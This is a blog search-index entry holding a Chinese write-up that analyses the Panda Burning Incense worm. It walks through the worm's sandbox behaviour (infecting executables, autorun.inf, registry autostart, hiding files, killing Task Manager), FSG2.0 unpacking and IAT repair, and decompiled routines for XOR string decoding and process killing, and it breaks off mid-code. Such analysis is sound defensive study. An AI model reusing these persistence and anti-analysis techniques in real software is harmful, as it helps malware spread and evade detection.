<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>熊猫烧香</title>
    <link href="/2025/09/30/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/"/>
    <url>/2025/09/30/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/</url>
    
    <content type="html"><![CDATA[<p>这B考公是一点都学不下去了，所以鼠鼠决定开一个新坑，学点一直很想学的病毒分析😋</p><h1 id="0x00-写在一切之前"><a href="#0x00-写在一切之前" class="headerlink" title="0x00.写在一切之前"></a>0x00.写在一切之前</h1><p>早在小学的时候，鼠鼠就听信计老师讲过熊猫烧香，那时只觉得这只揣着三根香的panda莫名的喜感🤔</p><p>现在，过去的回旋镖镖到了鼠鼠，鼠鼠也有能力和兴趣好好分析一下惹！</p><h1 id="0x01-基本信息"><a href="#0x01-基本信息" class="headerlink" title="0x01.基本信息"></a>0x01.基本信息</h1><p><a href="https://s.threatbook.com/report/file/40fee2a4be91d9d46cc133328ed41a3bdf9099be5084efbc95c8d0535ecee496">样本报告-微步在线云沙箱</a></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930150327.png"></p><h1 id="0x02-运行下试试欸😋"><a href="#0x02-运行下试试欸😋" class="headerlink" title="0x02.运行下试试欸😋"></a>0x02.运行下试试欸😋</h1><p>环境：win7 32位</p><h2 id="具体表现"><a href="#具体表现" class="headerlink" title="具体表现"></a>具体表现</h2><h3 id="1、大部分-exe文件图标变成熊猫烧香"><a href="#1、大部分-exe文件图标变成熊猫烧香" class="headerlink" title="1、大部分.exe文件图标变成熊猫烧香"></a>1、大部分.exe文件图标变成熊猫烧香</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930161245.png"></p><h3 id="2、被感染的文件夹下出现Desktop-ini文件，里面记录当前日期"><a href="#2、被感染的文件夹下出现Desktop-ini文件，里面记录当前日期" class="headerlink" title="2、被感染的文件夹下出现Desktop_.ini文件，里面记录当前日期"></a>2、被感染的文件夹下出现Desktop_.ini文件，里面记录当前日期</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930163053.png"></p><h3 id="3、打开任务管理器自动关闭"><a href="#3、打开任务管理器自动关闭" class="headerlink" title="3、打开任务管理器自动关闭"></a>3、打开任务管理器自动关闭</h3><h3 id="4、打开PChunter，发现可疑进程"><a href="#4、打开PChunter，发现可疑进程" class="headerlink" title="4、打开PChunter，发现可疑进程"></a>4、打开PChunter，发现可疑进程</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930163411.png"></p><h3 id="5、发现可疑启动项"><a href="#5、发现可疑启动项" class="headerlink" title="5、发现可疑启动项"></a>5、发现可疑启动项</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930163509.png"></p><h3 id="6、存在异常网络连接"><a href="#6、存在异常网络连接" class="headerlink" title="6、存在异常网络连接"></a>6、存在异常网络连接</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930170823.png"></p><p>内网都是139端口，这些外网ip抓包看了看发现都是雅虎、搜狐、google这类浏览器的ip</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930171407.png"></p><h2 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h2><p>开火绒安全分析，开始监控</p><h3 id="1、写入和修改文件"><a href="#1、写入和修改文件" class="headerlink" title="1、写入和修改文件"></a>1、写入和修改文件</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180220.png"></p><p>xiongmao.exe先在C:\Windows\System32\drivers\下生成可疑文件spo0lsv.exe</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180419.png"></p><p>到处生成Desktop_.ini</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180618.png"></p><p>在C盘根目录下生成setup.exe和autorun.inf</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180754.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180840.png"></p><p>autorun.inf里的内容，指定自动启动的文件是C:\setup.exe</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180925.png"></p><p>然后就是到处改.exe文件</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930181655.png"></p><p>其中FILE_modified操作我怀疑是文件隐藏之类的，because新创建的文件没一个直接显示的</p><h3 id="2、注册表-启动项"><a href="#2、注册表-启动项" class="headerlink" title="2、注册表&amp;启动项"></a>2、注册表&amp;启动项</h3><p>修改自启动项，查看注册表，可以看到确实是被改成了恶意程序</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930183703.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930183808.png"></p><p>修改文件夹属性使其不显示隐藏文件（1：不显示隐藏文件；2：显示；0：数据损坏，无法显示）</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930183901.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930184125.png"></p><p>对IE浏览器的一些配置进行修改</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930184252.png"></p><p>网络设置</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930184411.png"></p><p>看下来，大部分都是自启动和隐藏操作</p><h3 id="3、进程监控"><a href="#3、进程监控" class="headerlink" title="3、进程监控"></a>3、进程监控</h3><p>存在大量查找窗口，怀疑是在检测任务管理器</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930185637.png"></p><p>枚举进程，估计是查杀软🤔？</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930185744.png"></p><p>别的跨进程读写、快内存读写都挺常规的好像</p><h3 id="4、网络行为"><a href="#4、网络行为" class="headerlink" title="4、网络行为"></a>4、网络行为</h3><p>先内网的139端口连一圈，然后访问一些常见网站</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930190303.png"></p><h3 id="5、特殊行为"><a href="#5、特殊行为" class="headerlink" title="5、特殊行为"></a>5、特殊行为</h3><p>尼玛6.0的火绒剑用的属实不爽，换了一个5.0的</p><p>但是5.0的火绒剑开启监控后，一运行熊猫烧香就崩，单独离线版啥的都试了，没啥效果</p><p>刚开始怀疑是查找窗口或者是进程枚举把HRSword.exe给杀了🤔</p><p>后来一想不是哥们你07年的病毒杀火绒🗡，尊嘟假嘟</p><p>等会调试的时候看看</p><p>主要是少了这些恶意行为分析，很可惜</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/ab4434a955bfce5aec180bf8582a5bbc.png"></p><h1 id="0x03-样本提取"><a href="#0x03-样本提取" class="headerlink" title="0x03.样本提取"></a>0x03.样本提取</h1><p>点击运行，把释放在C:\Windows\System32\drivers\spo0lsv.exe提出来</p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>DIE看眼先</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001135442.png"></p><p>都是一些基本信息</p><p><strong>FSG2.0</strong>：简单来说就是文件里包含一个运行时“壳”程序，启动时先执行壳。壳负责在程序加载后解压（或解密）被压缩的代码到内存。当解压完成后，壳会跳转到程序的真实入口点（OEP，Original Entry Point），程序继续正常执行。</p><p>FSG2.0的壳的话，那就直接OD启动，动调着来脱了</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>一般FSG2.0先看有无pushad; popad这些特征汇编</p><p>可惜本样本并没有</p><p>那就直接追着esp来好了，在push ebp后面直接下断点</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001142250.png"></p><p>单步步进下去，存在stos的话就代表存在解密&amp;字节复制操作</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001143348.png"></p><p>继续单步，4001c6，获取模块基址；4001d6，获取函数基址，4001d9，填充IAT（导入地址表，类似elf中的got表个人感觉🤔）</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001143837.png"></p><p>这边三个跳转一般就意味着解压快结束了(oep一般存放在寄存器里)，在4001d1完成跳转</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001145001.png"></p><p>这个就正常多了，用插件dump出来</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001145149.png"></p><h2 id="修复IAT"><a href="#修复IAT" class="headerlink" title="修复IAT"></a>修复IAT</h2><p>使用ImportRec修复IAT</p><p>指定好OEP，感觉函数数量不对，循环了几十遍是有得，怎么才3个函数</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001150833.png"></p><p>查看IAT表，发现用0x7fffffff把模块隔开了👊</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001151209.png"></p><p>改成0后重新修复，选择刚才dump出来的文件修复</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001151855.png"></p><p>再次用DIE查看，发现壳已经去掉了</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001152420.png"></p><h1 id="0x04-静态-动态分析"><a href="#0x04-静态-动态分析" class="headerlink" title="0x04.静态&amp;动态分析"></a>0x04.静态&amp;动态分析</h1><p>ida打开，sig选择这个，可以识别出几个Delphi函数</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001154433.png"></p><p>查看程序入口start</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">start</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v0; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+8h] [ebp-18h]</span><br>  _DWORD v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-14h]</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+20h] [ebp+0h] BYREF</span><br><br>  v6 = <span class="hljs-number">0</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  Sysinit::__linkproc__ <span class="hljs-title function_">InitExe</span><span class="hljs-params">(dword_40D1C8)</span>;<br>  v5[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v5[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40D669;<br>  v5[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v5);<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D678;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D67C;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D680;        <span class="hljs-comment">// 设置SEH，win保护机制</span><br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D682;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7DC, dword_40D68C)</span>;<span class="hljs-comment">// 连接</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E0, dword_40D6B0)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D6D0)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7DC, dword_40D700)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E0, dword_40D710)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D720)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D72C;               <span class="hljs-comment">// 一堆全局/常量复制与字符串赋值</span><br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D730;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D732;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D738;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D73C;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D73E;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D744;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D748;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D74A;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D74C;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D750;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D754;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D756;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D760)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D76C;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D770;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D772;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D774;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D778;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D77C;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D77E;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D788)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D794;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D798;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D79A;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7A0;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7A4;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7A6;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7AC;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7B0;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7B2;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D7B4;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7B8;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7BC;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7BE;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D7C8)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7D4;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7D8;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7DA;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7E0;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7E4;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7E6;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7EC;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7F0;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7F2;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7F8;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7FC;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7FE;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D804;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D808;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D80A;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D80C;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D810;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D814;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D816;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D820)</span>;<span class="hljs-comment">// 连接</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7D4, dword_40D830)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7D8, dword_40D85C)</span>;<br>  sub_405250(dword_40D8A0, aXboy_0);            <span class="hljs-comment">// &quot;xboy&quot;</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(dword_40F7D4, v7[<span class="hljs-number">0</span>])</span>; <span class="hljs-comment">//验证？</span><br>  <span class="hljs-keyword">if</span> ( !v0 )<br>    ExitProcess_0(<span class="hljs-number">0</span>);<br>  sub_405250(&amp;unk_40D8DC, aWhboy_0);            <span class="hljs-comment">// &quot;whboy&quot;</span><br>  v1 = System::__linkproc__ LStrCmp(dword_40D908, v6);<span class="hljs-comment">//验证？</span><br>  <span class="hljs-keyword">if</span> ( !v0 )<br>    ExitProcess_0(<span class="hljs-number">0</span>);<br>  v2 = sub_40819C(v1);                          <span class="hljs-comment">// 主程序1</span><br>  v3 = sub_40D18C(v2);<br>  sub_40D088(v3);<br>  <span class="hljs-keyword">while</span> ( GetMessageA(&amp;Msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) )          <span class="hljs-comment">// windwos消息循环</span><br>    DispatchMessageA(&amp;Msg);<br>  __writefsdword(<span class="hljs-number">0</span>, v5[<span class="hljs-number">0</span>]);<br>  v4 = System::__linkproc__ LStrArrayClr(&amp;loc_40D670);<br>  System::__linkproc__ <span class="hljs-title function_">Halt0</span><span class="hljs-params">(v4)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这边比较明显的就是 “xboy”和”whboy”（武汉boy ?）两个字符串的验证</p><p>od里跟着调一下，感觉像405250像是个解密func，同时栈里面也出现了敏感信息</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001161411.png"></p><p>405250点进去一个异或贴脸，那decode是跑不了了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      v4 = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v6 = unknown_libname_75(v10);<br>        unknown_libname_70(&amp;v9, *(<span class="hljs-type">unsigned</span> __int8 *)(v14 + v4 - <span class="hljs-number">1</span>) ^ (*(<span class="hljs-type">unsigned</span> __int8 *)(v10 + v4 % v6) % <span class="hljs-number">0xA</span>u));<br>        System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(&amp;v11, v9)</span>;<br>        ++v4;<br>        --v3;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v3 );<br>    &#125;<br>......<br></code></pre></td></tr></table></figure><h2 id="sub-40819c"><a href="#sub-40819c" class="headerlink" title="sub_40819c"></a>sub_40819c</h2><p>首先进入主函数1，把几个自命名的函数先说一下</p><h3 id="sub-4053ac"><a href="#sub-4053ac" class="headerlink" title="sub_4053ac"></a>sub_4053ac</h3><p>此函数的返回值为固定返回C:\Windows\System32，故重命名为 GetSystemDirectory</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">GetSystemDirectory</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  CHAR Buffer[<span class="hljs-number">268</span>]; <span class="hljs-comment">// [esp+0h] [ebp-10Ch] BYREF</span><br><br>  GetSystemDirectoryA(Buffer, <span class="hljs-number">0x104</span>u);<br>  unknown_libname_112(a1, Buffer, <span class="hljs-number">261</span>);<br>  result = unknown_libname_113(*a1);<br>  <span class="hljs-keyword">if</span> ( *(_BYTE *)(*a1 + result - <span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;\\&#x27;</span> )<br>    <span class="hljs-keyword">return</span> System::__linkproc__ LStrCat(a1, &amp;dword_405400);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sub-405fc4"><a href="#sub-405fc4" class="headerlink" title="sub_405fc4"></a>sub_405fc4</h3><p>此函数的功能为kill指定进程，故重命名为VirusKiller</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">_DWORD *__fastcall <span class="hljs-title function_">VirusKiller</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  _DWORD *v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">void</span> *hObject; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">bool</span> i; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp-10h] [ebp-158h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-154h] BYREF</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+8h] [ebp-140h] BYREF</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+Ch] [ebp-13Ch] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+10h] [ebp-138h] BYREF</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+14h] [ebp-134h] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+18h] [ebp-130h] BYREF</span><br>  _DWORD v13[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-12Ch] BYREF</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+40h] [ebp-108h] BYREF</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [esp+144h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+148h] [ebp+0h] BYREF</span><br><br>  v12 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v15 = a1;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(a1)</span>;<br>  v1 = v13;<br>  v7[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v7[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_4060F6;<br>  v7[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v7);<br>  hObject = (<span class="hljs-type">void</span> *)unknown_libname_114(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v13[<span class="hljs-number">0</span>] = <span class="hljs-number">296</span>;<br>  <span class="hljs-keyword">for</span> ( i = unknown_libname_115(hObject, v13) != <span class="hljs-number">0</span>; i; i = unknown_libname_116(hObject, v13) != <span class="hljs-number">0</span> )<br>  &#123;<br>    unknown_libname_93(v15, &amp;v11);<br>    sub_405E98(v11, &amp;v12);<br>    v6 = v12;<br>    unknown_libname_112(&amp;v8, &amp;v14, <span class="hljs-number">260</span>);<br>    unknown_libname_93(v8, &amp;v9);<br>    sub_405E98(v9, &amp;v10);<br>    System::__linkproc__ <span class="hljs-title 